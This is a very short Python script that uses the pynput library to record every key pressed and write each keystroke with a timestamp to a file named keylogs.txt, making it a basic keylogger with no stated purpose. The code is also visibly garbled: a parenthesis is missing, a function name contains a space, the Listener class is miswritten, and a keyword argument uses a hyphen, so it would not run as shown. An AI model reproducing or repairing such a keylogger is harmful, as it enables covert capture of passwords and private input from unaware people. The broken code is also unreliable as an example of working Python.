from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s'
def on press (key):
	logging.info (str (key))
with listener (on_press-on press) as listener:
	listener.join()
